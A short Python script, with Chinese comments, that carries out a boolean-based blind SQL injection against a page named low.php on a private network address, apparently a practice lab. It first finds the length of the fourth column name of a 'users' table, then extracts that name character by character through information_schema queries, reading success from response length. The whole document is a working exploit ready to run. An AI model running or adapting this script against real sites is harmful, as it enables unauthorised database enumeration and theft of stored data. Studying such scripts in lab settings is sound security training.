import requests
# 基于布尔的盲注
#共9列
#获取到users表的第四列列名 password
#长度为8

base_url = 'http://192.168.254.147/SQL_injection/low.php? %s &Submit_ID=确认'

def get_table_column_name(length:int):
    column_name = ""
    content_template = "id=1 and ASCII(SUBSTR(" \
                       "(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name = 'users' LIMIT 4,1)," \
                       "%d,1))=%d"
    chars = '_$0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, length + 1):
        for char in chars:
            content = content_template % (i, ord(char))
            url = base_url % content
            # print(url)

            response = requests.get(url)
            resLen = len(response.text)
            # 根据返回长度的不同来判断字符正确与否
            # print(length)
            if resLen > 600:
                column_name += char
                break
    print(column_name)

def get_table_column_name_length():
    length = 0
    content_template = "id=1 AND (select length(column_name) from information_schema.columns where table_schema=database() AND table_name = 'users' limit 4,1)=%d"

    for i in range(1, 64):
        content = content_template % i
        url = base_url % content
        # print (url)
        response = requests.get(url)
        resLen = len(response.text)
        # print(resLen)
        if resLen > 600:
            length = i
            break;
    return length

if __name__ == '__main__':
    length = get_table_column_name_length()
    get_table_column_name(length)